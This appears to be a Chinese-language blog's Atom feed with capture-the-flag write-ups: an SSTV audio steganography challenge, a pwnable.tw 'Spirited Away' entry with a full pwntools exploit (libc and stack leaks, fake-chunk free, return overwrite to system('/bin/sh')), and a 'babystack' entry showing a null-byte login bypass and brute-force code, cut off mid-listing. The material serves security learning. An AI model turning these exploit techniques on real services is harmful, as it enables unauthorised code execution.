<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KANGEL</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://j-kangel.github.io/"/>
  <updated>2020-07-08T13:32:35.058Z</updated>
  <id>https://j-kangel.github.io/</id>
  
  <author>
    <name>kangel</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从一道Misc到学习百万混音</title>
    <link href="https://j-kangel.github.io/2020/07/09/%E4%BB%8E%E4%B8%80%E9%81%93Misc%E5%88%B0%E5%AD%A6%E4%B9%A0%E7%99%BE%E4%B8%87%E6%B7%B7%E9%9F%B3/"/>
    <id>https://j-kangel.github.io/2020/07/09/从一道Misc到学习百万混音/</id>
    <published>2020-07-08T20:11:01.000Z</published>
    <updated>2020-07-08T13:32:35.058Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末打了下STCF，有一道wav的misc，尝试了wav隐写的各种方法都失败了，今天看了下wp，学到了一种叫sstv（慢扫描电视）的东西。</p><h3 id="sstv"><a href="#sstv" class="headerlink" title="sstv"></a>sstv</h3><p><strong>慢扫描电视（Slow-scan television）是<a href="https://baike.baidu.com/item/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5" target="_blank" rel="noopener">业余无线电</a>爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。    </strong></p><p>简单点说，就是图片在发送的时候调制成一种哔哔的声音，接收的时候再将这种声音解调成图片。因此需要用到sstv相关的软件</p><p>PC：<a href="https://hamsoft.ca/pages/mmsstv.php" target="_blank" rel="noopener">MMSSTV</a></p><p>android: robot36(好像只能接收不能发送)</p><p>有了两台设备，我们就可进行图片传输了，例如：从PC传一张“神奈川冲浪里”到手机上</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/1.png" class="lazyload"></p><p>可以看到图片成功传送，但是会受周围环境的影响，因此有一定的失真。</p><h3 id="SCTF2020-can-you-hear-me"><a href="#SCTF2020-can-you-hear-me" class="headerlink" title="SCTF2020 can you hear me"></a>SCTF2020 can you hear me</h3><p>貌似有点扯远了，我们回到这道misc上来。题目文件是一段哔哔的音频，我们直接利用MMSSTV或者robot36进行接收，便可以得到flag</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/2.png" class="lazyload"></p><h3 id="2018-QCTF-Noise"><a href="#2018-QCTF-Noise" class="headerlink" title="2018 QCTF Noise"></a>2018 QCTF Noise</h3><p>好像有点简单，且上述内容与百万混音都没啥关系，但是当我在搜索类似题目的时候，发现了这道题。题目源文件是一段音乐，具体参考<a href="https://blog.csdn.net/u011297466/article/details/81059248" target="_blank" rel="noopener">wp</a></p><p>这里有意思的是需要利用干涉消音提取出sstv的信号，这里就要用到AU进行消音，于是顺势学习了一波AU。</p><p>1、打开AU，新建多轨工程，导入源文件和从网易云下载的原曲《My Little Pony Theme Song》</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/3.PNG" class="lazyload"></p><p>可以看到两段音轨非常相似</p><p>2、将原曲进行反相</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/4.PNG" class="lazyload"></p><p>3、播放，robot36接收</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/5.png" class="lazyload"></p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>顺势学习了一波AU，刚好刚买的音箱也快到了，到时候可以借着连绵阴雨，抚琴一曲，再加上百万混音，岂不美哉！</p><p>​                                                              </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;周末打了下STCF，有一道wav的misc，尝试了wav隐写的各种方法都失败了，今天看了下wp，学到了一种叫sstv（慢扫描电视）的东西。&lt;
      
    
    </summary>
    
      <category term="misc" scheme="https://j-kangel.github.io/categories/misc/"/>
    
    
      <category term="misc" scheme="https://j-kangel.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw Spirited Away</title>
    <link href="https://j-kangel.github.io/2020/06/23/pwnable-tw-Spirited-Away/"/>
    <id>https://j-kangel.github.io/2020/06/23/pwnable-tw-Spirited-Away/</id>
    <published>2020-06-22T23:26:33.000Z</published>
    <updated>2020-06-22T15:44:59.491Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这道题是栈溢出与堆溢出的结合，利用sprintf函数进行溢出。</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  spirit-away checksec ./spirited_away</span><br><span class="line">[*] &apos;/mnt/hgfs/shared/tw/spirit-away/spirited_away&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位程序，只开启了NX</p><h4 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h4><p>survay函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">survey</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+10h] [ebp-E8h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+48h] [ebp-B0h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+4Ch] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+50h] [ebp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+A0h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [esp+A4h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+A8h] [ebp-50h]</span></span><br><span class="line"></span><br><span class="line">  nbytes = <span class="number">0x3C</span>;</span><br><span class="line">  v3 = <span class="number">0x50</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nPlease enter your name: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your age: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Why did you came to see this movie? "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v7, v3);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your comment: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Age: %d\n"</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Reason: %s\n"</span>, &amp;v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;v1);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( cnt &gt; <span class="number">199</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"200 comments is enough!"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;choice, <span class="number">3u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="string">'Y'</span> || choice == <span class="string">'y'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(buf);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="string">'N'</span> || choice == <span class="string">'n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong choice."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现实现的是一个留言板的功能，该程序存在两个漏洞：</p><ol><li>利用read函数可以泄露出栈中的地址，其中包括libc和栈地址</li><li>sprintf函数存在单字节溢出</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当cnt为三位数，例如100时</span><br><span class="line">&gt;&gt;&gt; len(&quot;100 comment so far. We will review them as soon as we can&quot;)                 </span><br><span class="line">57</span><br><span class="line"></span><br><span class="line">这时最后一个字节n会覆盖掉nbytes，这时nbyte==0x6e，在read buf和&amp;s时都会产生溢出</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>泄露libc和栈地址，并计算出system和“/bin/sh”的地址</li><li>在栈上布置好fake_chunk,利用&amp;s的溢出覆盖buf的值为fake_chunk地址并进行free</li><li>利用buf（现在为栈地址）的溢出覆盖掉返回值</li></ol><p>完整脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./spirited_away"</span>)</span><br><span class="line"><span class="comment"># p = remote("chall.pwnable.tw", 10204)</span></span><br><span class="line">elf = ELF(<span class="string">"./spirited_away"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc_32.so.6")</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line">r = <span class="keyword">lambda</span> : p.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x0804a084'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span><span class="params">(name,reason,comment)</span>:</span></span><br><span class="line">    sa(<span class="string">'Please enter your name: '</span>, name)</span><br><span class="line">    sa(<span class="string">'Please enter your age: '</span>, <span class="string">'1\n'</span>)</span><br><span class="line">    sa(<span class="string">'Why did you came to see this movie? '</span>, reason)</span><br><span class="line">    sa(<span class="string">'Please enter your comment: '</span>, comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">andone</span><span class="params">()</span>:</span></span><br><span class="line">    sa(<span class="string">'Would you like to leave another comment? &lt;y/n&gt;: '</span>, <span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overflow to nbytes</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    leave(<span class="string">'kangel\0'</span>,<span class="string">'a\0'</span>,<span class="string">'b\0'</span>)</span><br><span class="line">    andone()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    sa(<span class="string">'Please enter your age: '</span>, <span class="string">'1\n'</span>)</span><br><span class="line">    sa(<span class="string">'Why did you came to see this movie? '</span>, <span class="string">'c\x00'</span>)</span><br><span class="line">    sa(<span class="string">'Would you like to leave another comment? &lt;y/n&gt;: '</span>, <span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">leave(<span class="string">'kangel\0'</span>,<span class="string">'a'</span>*<span class="number">0x14</span>+<span class="string">'bbbb'</span>,<span class="string">'123'</span>)</span><br><span class="line">ru(<span class="string">"bbbb"</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">7</span> - libc.sym[<span class="string">'_IO_file_sync'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">andone()</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">leave(<span class="string">'kangel\0'</span>,<span class="string">'a'</span>*<span class="number">0x34</span>+<span class="string">'bbbb'</span>,<span class="string">'123'</span>)</span><br><span class="line">ru(<span class="string">"bbbb"</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x70</span></span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line">andone()</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_chunk</span></span><br><span class="line">reason = p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + <span class="string">'a'</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">comment = <span class="string">'a'</span>*<span class="number">0x54</span> + p32(stack+<span class="number">8</span>)</span><br><span class="line">leave(<span class="string">'kangel\0'</span>,reason,comment)</span><br><span class="line">andone()</span><br><span class="line"></span><br><span class="line"><span class="comment">#heap overflow</span></span><br><span class="line">name = <span class="string">'a'</span>*<span class="number">0x4c</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">leave(name,<span class="string">'a\0'</span>,<span class="string">'b\0'</span>)</span><br><span class="line"><span class="comment"># gd()</span></span><br><span class="line">sa(<span class="string">'Would you like to leave another comment? &lt;y/n&gt;: '</span>, <span class="string">'n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这道题是栈溢出与堆溢出的结合，利用sprintf函数进行溢出。&lt;/p&gt;
&lt;h3 id=&quot;程序分析&quot;&gt;&lt;a href=&quot;#程序分析&quot; clas
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="pwnable.tw" scheme="https://j-kangel.github.io/tags/pwnable-tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw babystack</title>
    <link href="https://j-kangel.github.io/2020/06/22/pwnable-tw-babystack/"/>
    <id>https://j-kangel.github.io/2020/06/22/pwnable-tw-babystack/</id>
    <published>2020-06-22T09:27:11.000Z</published>
    <updated>2020-06-22T02:06:10.076Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一道组合溢出的题目，与常见的栈溢出不同，故记录一下。</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  babystack checksec ./babystack</span><br><span class="line">[*] &apos;/mnt/hgfs/shared/tw/babystack/babystack&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>保护全开，既然是栈溢出，那么泄露canary是必不可少的。</p><h4 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h4><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  sub_D30();</span><br><span class="line">  dword_202018[<span class="number">0</span>] = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  read(dword_202018[<span class="number">0</span>], &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  v3 = qword_202020;</span><br><span class="line">  v4 = v8;</span><br><span class="line">  *(_QWORD *)qword_202020 = buf;</span><br><span class="line">  v3[<span class="number">1</span>] = v4;</span><br><span class="line">  close(dword_202018[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"&gt;&gt; "</span>, <span class="number">3u</span>LL);</span><br><span class="line">    _read_chk(<span class="number">0L</span>L, (__int64)&amp;v9, <span class="number">16L</span>L, <span class="number">16L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v9 == <span class="string">'2'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 == <span class="string">'3'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( is_login )</span><br><span class="line">        copy(&amp;v6);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == <span class="string">'1'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( is_login )</span><br><span class="line">        is_login = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        login((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !is_login )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;buf, qword_202020, <span class="number">0x10</span>uLL) )</span><br><span class="line">    JUMPOUT(loc_100B);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先读取16字节的随机数到栈上，并赋值给bss段上qword_202020。接着进入while循环，函数结束时会判断buf和qword_202020的值。可以发现这里的canary保护和常规的有点不同，因此需要泄露buf的值。</p><p>下面进入循环：</p><p>login函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">login</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your passowrd :"</span>);</span><br><span class="line">  sub_CA0((<span class="keyword">unsigned</span> __int8 *)&amp;s, <span class="number">0x7F</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, a1, v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Failed !"</span>);</span><br><span class="line">  is_login = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login Success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当is_login==0时会进入login函数，这里首先读取数据到栈上，然后和buf的值进行strncmp判断。这里有两种绕过方法：</p><p>1、利用‘\x00’进行截断，因为strlen碰上’\x00’ 和’\x0a’会产生阶段，因此可以直接绕过strncmp的判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login(<span class="string">'\x00'</span>+<span class="string">'a'</span>*<span class="number">0x57</span>)</span><br></pre></td></tr></table></figure><p>2、逐字节进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span><span class="params">(length,s1 = <span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">10</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s2 = s1 + chr(i)</span><br><span class="line">            login(s2+<span class="string">'\x00'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Success"</span> <span class="keyword">in</span> p.recv():</span><br><span class="line">                s1 = s2</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+]found!"</span></span><br><span class="line">                logout()</span><br><span class="line">                sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(s2) == length:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> s1</span><br></pre></td></tr></table></figure><p>copy函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 